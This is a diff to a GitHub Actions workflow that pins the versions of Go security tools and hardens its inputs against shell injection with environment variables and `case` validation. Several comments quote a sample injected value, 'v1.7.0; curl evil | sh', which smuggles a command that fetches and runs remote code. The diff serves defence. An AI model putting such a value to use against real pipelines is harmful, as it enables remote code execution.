@@ -27,6 +27,16 @@ on:
         description: 'Enable Go official vulnerability database check'
         type: boolean
         default: true
+      govulncheck_version:
+        description: >-
+          govulncheck version to install, as a Go module query. Pinned rather than `@latest` so that
+          an upstream release cannot change what this workflow runs without anyone here choosing it:
+          golang.org/x/vuln v1.8.0 raised its own `go` directive to 1.26.0 and broke every Go
+          repository on this channel the day it landed, because the install step has no
+          `continue-on-error` to soften it. The install itself runs under GOTOOLCHAIN=auto, so this
+          default works at any go_version — it does NOT have to track it.
+        type: string
+        default: 'v1.7.0'
       enable_nancy:
         description: 'Enable Nancy dependency vulnerability scanner'
         type: boolean
@@ -43,6 +53,15 @@ on:
         description: 'Enable go-licenses compliance check'
         type: boolean
         default: true
+      go_licenses_version:
+        description: >-
+          go-licenses version to install, as a Go module query. Pinned for the same reason as
+          govulncheck_version: `@latest` is resolved against the toolchain actions/setup-go pins for
+          the job, so an upstream release raising its own `go` directive past go_version breaks the
+          install outright and there is no `continue-on-error` here to soften it. v1.6.0 declares
+          `go 1.16` and installs anywhere today — this pin is what keeps that true tomorrow.
+        type: string
+        default: 'v1.6.0'
       enable_sbom:
         description: 'Enable SBOM (Software Bill of Materials) generation'
         type: boolean
@@ -126,7 +145,33 @@ jobs:
           cache: true
 
       - name: Install govulncheck
-        run: go install golang.org/x/vuln/cmd/govulncheck@latest
+        env:
+          # actions/setup-go exports GOTOOLCHAIN=local for the whole job, so `go install` of a tool
+          # whose own `go` directive is newer than go_version REFUSES instead of upgrading. That is
+          # right for the scan (it must analyse under the pinned toolchain) and wrong for BUILDING
+          # the scanner, so the override is scoped to this step alone.
+          GOTOOLCHAIN: auto
+          # Never interpolated into the script body: `${{ }}` is substituted BEFORE the shell sees
+          # the line, so a caller passing `v1.7.0; curl evil|sh` would be running commands, not
+          # naming a version. As an env var it is data the shell expands, and the check below bounds
+          # it to a module query even if a caller forwards something untrusted into this input.
+          GOVULNCHECK_VERSION: ${{ inputs.govulncheck_version }}
+        run: |
+          # CHARSET FIRST, SHAPE SECOND, and in that order for a reason. A shape glob alone accepts
+          # "v1.7.0; curl evil | sh" — its trailing * swallows the payload — and `grep -E` matches
+          # LINE BY LINE, so a value whose first line is "v1.7.0" passes whatever follows the
+          # newline. `case` tests the whole string at once, so rejecting every character outside
+          # the module-query set closes both holes before the shape is considered.
+          case "$GOVULNCHECK_VERSION" in
+            *[!0-9A-Za-z.+_-]*)           bad=1 ;;
+            latest|v[0-9]*.[0-9]*.[0-9]*) bad=  ;;
+            *)                            bad=1 ;;
+          esac
+          if [ -n "$bad" ]; then
+            echo "::error::govulncheck_version must be 'latest' or a vX.Y.Z module query, got '$GOVULNCHECK_VERSION'"
+            exit 1
+          fi
+          go install "golang.org/x/vuln/cmd/govulncheck@$GOVULNCHECK_VERSION"
 
       - name: Run govulncheck
         run: govulncheck ./...
@@ -215,11 +260,46 @@ jobs:
           cache: true
 
       - name: Install go-licenses
-        run: go install github.com/google/go-licenses@latest
+        env:
+          # Building the tool is not the scan. actions/setup-go exports GOTOOLCHAIN=local job-wide,
+          # which makes `go install` REFUSE a tool whose `go` directive is newer than go_version
+          # instead of upgrading; the override is scoped to this step so the licence walk below
+          # still runs under the pinned toolchain.
+          GOTOOLCHAIN: auto
+          # Data, never script: `${{ }}` is substituted before the shell sees the line.
+          GO_LICENSES_VERSION: ${{ inputs.go_licenses_version }}
+        run: |
+          # Charset before shape — a shape glob alone accepts "v1.6.0; curl evil | sh" because its
+          # trailing * swallows the payload, and `grep -E` would match line by line. `case` tests
+          # the whole string at once.
+          case "$GO_LICENSES_VERSION" in
+            *[!0-9A-Za-z.+_-]*)           bad=1 ;;
+            latest|v[0-9]*.[0-9]*.[0-9]*) bad=  ;;
+            *)                            bad=1 ;;
+          esac
+          if [ -n "$bad" ]; then
+            echo "::error::go_licenses_version must be 'latest' or a vX.Y.Z module query, got '$GO_LICENSES_VERSION'"
+            exit 1
+          fi
+          go install "github.com/google/go-licenses@$GO_LICENSES_VERSION"
 
       - name: Check licenses
+        env:
+          # Data, never script. This predates the govulncheck work and was never flagged, which is
+          # the argument FOR fixing it rather than against: an unflagged sink is still a sink, and
+          # `${{ }}` is substituted before the shell sees the line either way.
+          LICENSE_DISALLOWED_TYPES: ${{ inputs.license_disallowed_types }}
         run: |
-          go-licenses check ./... --disallowed_types=${{ inputs.license_disallowed_types }}
+          # go-licenses takes a comma-separated list of type names — forbidden, restricted,
+          # reciprocal, notice, permissive, unencumbered, unknown — so nothing outside letters,
+          # commas and word punctuation is a legitimate value. `case` tests the whole string, which
+          # a shape glob with a trailing * or a line-by-line `grep -E` would not.
+          case "$LICENSE_DISALLOWED_TYPES" in
+            ''|*[!a-zA-Z,_-]*)
+              echo "::error::license_disallowed_types must be a comma-separated list of go-licenses type names, got '$LICENSE_DISALLOWED_TYPES'"
+              exit 1 ;;
+          esac
+          go-licenses check ./... --disallowed_types="$LICENSE_DISALLOWED_TYPES"
 
       - name: Generate license report
         run: |
